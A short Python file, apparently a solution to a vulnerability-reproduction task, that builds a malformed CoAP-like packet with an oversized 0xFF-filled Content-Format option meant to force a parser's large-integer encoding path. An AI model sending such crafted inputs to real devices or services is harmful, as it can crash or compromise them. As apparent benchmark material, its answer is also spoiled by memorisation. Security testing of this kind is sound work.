import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        if src_path and not os.path.exists(src_path):
            pass

        # CoAP-like packet:
        # Header: Ver=1, Type=CON, TKL=8 (0x48), Code=GET (0x01), MsgID=0x0000
        # Token: 8 bytes
        # Option: delta=12 (Content-Format), length=8 => 0xC8
        # Value: 8 bytes (all 0xFF) to force large uint encoding
        return bytes([0x48, 0x01, 0x00, 0x00] + [0x00] * 8 + [0xC8] + [0xFF] * 8)